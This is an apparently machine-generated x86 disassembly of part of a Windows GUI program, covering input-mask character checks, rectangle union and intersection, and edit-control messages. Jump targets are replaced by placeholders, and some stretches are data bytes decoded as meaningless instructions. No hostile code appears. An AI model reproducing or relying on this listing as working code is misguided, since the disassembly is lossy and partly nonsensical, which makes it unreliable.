mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax ]
call sub_402a54
pop edx
cmp dl al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_46dbdc
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_40bff0
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
call sub_46dbdc
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x1 ]
call sub_40bff0
cmp al 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f061
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
sub_46f06c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46f31e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_46ccd0
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_46ce24
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x43
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
call sub_46cea0
mov [ ebx ] al
jmp r-xdata
sub eax 0x4c
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f325
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_404098
retn
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x15
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x23
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40410c
lea eax [ ebp - 0x10 ]
call j_sub_404540#2
mov dl [ ebx ]
mov [ eax ] dl
mov al [ ebx ]
call sub_46ef74
test al al
je r-xdata
push ebp
mov al [ ebx ]
call sub_46ef8c
pop ecx
test al al
je r-xdata
sub eax 0x2
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
je r-xdata
push ebp
mov al [ ebx ]
call sub_46ef8c
pop ecx
test al al
je r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0xd
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40410c
lea eax [ ebp - 0x10 ]
call j_sub_404540#2
mov dl [ ebx ]
mov [ eax ] dl
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x20
je r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0x9
je r-xdata
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x41
je r-xdata
jmp r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_407e3c
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_40410c
jmp r-xdata
cmp [ ebx ] 0x2b
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
sub eax 0x8
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_407e3c
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_40410c
jmp r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaNumericA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x61
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_407e70
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_40410c
cmp [ ebx ] 0x2d
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_407e70
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_40410c
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_46f333
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov [ esp + 0x8 ] 0x1
mov [ esp + 0xc ] 0x1
mov eax [ ebp + 0x220 ]
call sub_404334
mov esi eax
test esi esi
jle r-xdata
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc edi
dec esi
jne r-xdata
cmp bl 0x4
jne r-xdata
mov eax [ ebp + 0x220 ]
mov edx edi
call sub_46ccd0
mov ebx eax
mov eax ebx
dec eax
sub al 0x2
jb r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp + 0x224 ]
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0xc ]
dec eax
mov edx [ esp + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
inc [ esp + 0xc ]
mov eax [ ebp + 0x220 ]
cmp [ eax + edi - 0x1 ] 0x43
je r-xdata
sub_46f3f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test eax eax
je r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x8 ]
inc ebx
add eax ebx
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_46d2ac
mov esi eax
test esi esi
jl r-xdata
mov eax [ edi + 0x220 ]
call sub_404334
sub eax esi
jl r-xdata
inc eax
xchg esi eax
mov [ ebp - 0x14 ] eax
add al 0xfc
sub al 0x2
jae r-xdata
inc ebx
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call j_sub_404540#2
mov dl [ edi + 0x224 ]
mov [ eax + ebx - 0x1 ] dl
inc ebx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x14 ]
call sub_46ccd0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
sub_46f488
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46f738
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f73f
lea eax [ ebp - 0x34 ]
mov edx 0x8
call sub_404098
lea eax [ ebp - 0x10 ]
call sub_404074
retn
mov ebx 0x1
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_40410c
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x220 ]
call sub_46d2ac
mov edi eax
test edi edi
jl r-xdata
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_404334
cmp edi eax
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46ccd0
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
call sub_404334
add eax [ ebp + 0x8 ]
cmp eax [ esi + 0x228 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
mov [ ebp - 0x11 ] al
lea edx [ ebp - 0x11 ]
mov ecx edi
mov eax esi
call sub_46f06c
test al al
jne r-xdata
dec eax
sub al 0x2
jae r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_40bff0
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404334
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40bff0
cmp al 0x2
jne r-xdata
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax ebx
cmp eax [ esi + 0x228 ]
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ esi + 0x228 ]
sub ecx edi
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404594
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404594
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
pop ecx
call sub_404380
inc edi
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404594
push [ ebp - 0x28 ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
call sub_404334
add eax [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx eax
push edx
mov eax [ ebp - 0x10 ]
call sub_404334
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
pop ecx
call sub_404594
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043f4
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov dl [ esi + 0x224 ]
call sub_40425c
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_40433c
inc ebx
lea eax [ ebp - 0x10 ]
call j_sub_404540#2
mov dl [ ebp - 0x11 ]
mov [ eax + ebx - 0x1 ] dl
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
mov al [ esi + 0x224 ]
mov [ ebp - 0x11 ] al
lea eax [ ebp - 0x10 ]
call j_sub_404540#2
mov dl [ esi + 0x224 ]
mov [ eax + ebx ] dl
mov eax [ ebp - 0x10 ]
call sub_404334
cmp eax ebx
jl r-xdata
add ebx [ ebp + 0x8 ]
dec ebx
mov [ ebp - 0x8 ] ebx
inc ebx
inc ebx
inc edi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404594
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0x11 ]
call sub_40425c
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_404334
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_404594
push [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4043f4
inc edi
sub_46f74c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
or ebp 0xffffffff
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_404334
cmp edi eax
jl r-xdata
inc edi
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46ccd0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x220 ]
mov dl [ edx + edi - 0x1 ]
cmp al 0x2
jne r-xdata
cmp bl dl
jne r-xdata
mov eax edx
call sub_46cea0
mov edx eax
mov ebp edi
jmp r-xdata
sub_46f7a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f7cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f7d4
retn
sub_46f7e4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xf8
inc esi
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
inc ecx
add ah bh
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc eax 0x766e4945
popad
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x704f6469
jb r-xdata
in al dx
add eax 0xdbe00044
inc ebx
add [ eax + ebp * 4 + 0x41 ] ch
add al cl
rol [ ebx ] cl
je r-xdata
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax ] dl
adc eax [ edi ]
and al 0x4c
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x3fffbbba ] ah
inc esi
inc esp
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add [ esi + ebx + 0x43 ] ch
add [ eax ] al
rol [ ebx ] cl
push esp
fld [ ebx ]
int3
fild [ ebx ]
insb
test al 0x41
xor al 0x40
add [ esp + 0x32380043 ] bl
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x4 ] cl
inc esp
add [ eax ] dl
push ecx
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x34 ] eax
inc esp
inc ecx
add ah cl
inc [ ebx ]
enter 0x43d2 0x0
outsd
outsb
mov eax eax
nop
clc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
stc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 8 - 0x62dffba ] dl
inc esi
add [ eax + 0x2 ] cl
add [ eax ] al
xor al 0xd7
inc esi
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
sub_470e7c
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
mov eax [ esp ]
cmp eax [ esp + 0x8 ]
jge r-xdata
mov eax [ esp ]
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jle r-xdata
mov [ ecx ] eax
mov eax [ esp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0xc ]
jge r-xdata
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
jle r-xdata
mov [ ecx + 0x4 ] eax
add esp 0x10
pop edi
pop esi
retn
mov [ ecx + 0xc ] eax
sub_470f1c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_470f00
test al al
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_470f00
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov edx [ ebx ]
mov [ esi ] edx
mov edx [ ebx + 0x4 ]
mov [ esi + 0x4 ] edx
xor eax eax
jmp r-xdata
test al al
je r-xdata
sub_470f68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax edi
call sub_470f1c
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_470f1c
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
lea edx [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
call sub_470f1c
pop ecx
test al al
jne r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
sub_470fe0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax ebx
xor ecx ecx
mov edx 0x40
call sub_402cbc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call UnionRect
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x28 ]
call sub_412988
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x28 ]
call sub_412988
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x28 ]
call sub_412988
lea edx [ ebp - 0x40 ]
mov eax ebx
pop ecx
call sub_470f68
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi eax
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
call sub_412988
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x10 ]
call sub_412988
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x18 ]
call sub_412988
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x10 ]
pop ecx
call sub_470f68
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebx + 0x8 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412988
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_412988
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x20 ]
call sub_412988
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x20 ]
pop ecx
call sub_470f68
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebx + 0x1c ] eax
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_412988
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_412988
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x28 ]
call sub_412988
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x30 ]
pop ecx
call sub_470f68
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x34 ] eax
sub_471170
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47124f
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471256
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404098
retn
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov esi [ eax ]
xor esi esi
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x8 ]
call sub_470e64
cmp esi [ ebp - 0x4 ]
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
cmp esi 0x7fffffe
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0xc ]
call sub_470e64
jmp r-xdata
add edi esi
mov esi edi
test esi esi
jge r-xdata
test esi esi
jle r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x10 ]
call sub_470e64
mov edx esi
shl edx 0x2
mov eax ebx
call sub_40270c
cmp [ ebx ] 0x0
je r-xdata
inc esi
mov eax [ ebp - 0x4 ]
inc eax
cmp esi eax
jle r-xdata
dec esi
mov eax [ ebx ]
mov [ eax ] esi
mov edx [ ebx ]
mov ecx [ ebp + 0x8 ]
mov [ edx + eax * 4 ] ecx
inc eax
cmp esi eax
jg r-xdata
sub_471260
push ebx
push esi
xor esi esi
cmp [ eax ] 0x0
je r-xdata
push ecx
mov ecx edx
sub ecx esi
mov edx esi
call sub_471170
pop esi
pop ebx
retn
mov ebx [ eax ]
mov esi [ ebx ]
sub_47127c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
mov edi [ eax + edx * 4 ]
cmp esi edx
jle r-xdata
cmp esi edx
jge r-xdata
mov eax esi
sub eax edx
mov ecx eax
shl ecx 0x2
mov eax [ ebx ]
lea eax [ eax + edx * 4 + 0x4 ]
mov ebp [ ebx ]
lea edx [ ebp + edx * 4 ]
call sub_4028c8
jmp r-xdata
mov eax [ ebx ]
mov [ eax + esi * 4 ] edi
mov eax [ ebx ]
lea eax [ eax + esi * 4 ]
mov ecx [ ebx ]
lea ecx [ ecx + esi * 4 + 0x4 ]
sub edx esi
shl edx 0x2
xchg edx ecx
call sub_4028c8
sub_4712d4
push ebx
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
test edi edi
sete dl
test edi edi
je r-xdata
mov eax edx
pop edi
pop esi
pop ebx
retn
mov esi [ eax ]
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
mov ebx [ eax + ecx * 4 ]
cmp ebx [ edi + ecx * 4 ]
jne r-xdata
sub_471310
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46d918
xor edx edx
mov eax esi
call sub_444768
xor edx edx
mov eax esi
call sub_444738
xor edx edx
mov eax esi
call sub_44482c
xor edx edx
mov eax esi
call sub_431e80
mov [ esi + 0x1f8 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_47138c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x240 ]
test [ eax + 0x249 ] 0x8
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x2
sub_4713b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46de0c
sub_4713d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4713f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46ddd8
sub_471428
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] dl
lea edx [ ebp - 0x9 ]
push edx
mov dl [ ebp - 0x1 ]
mov eax [ eax + 0x240 ]
mov si 0xffe2
call sub_40349c
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_471470
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x9 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffbc
call sub_40349c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
pop esi
pop ebp
retn
sub_4714a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov edx [ eax + 0x1d8 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov dl [ edx - 0x9 ]
push edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
sub_471518
push ebp
mov ebp esp
push ebx
mov ebx eax
lea eax [ ebx + 0x4 ]
push eax
push ebx
push 0xb0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
pop ebx
pop ebp
retn
sub_47153c
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
call GetCaretPos
mov dx [ ebp - 0x4 ]
mov ax [ ebp - 0x8 ]
call sub_406a8c
push eax
push 0x0
push 0xd7
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
pop ecx
pop ecx
pop ebp
retn
sub_471578
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
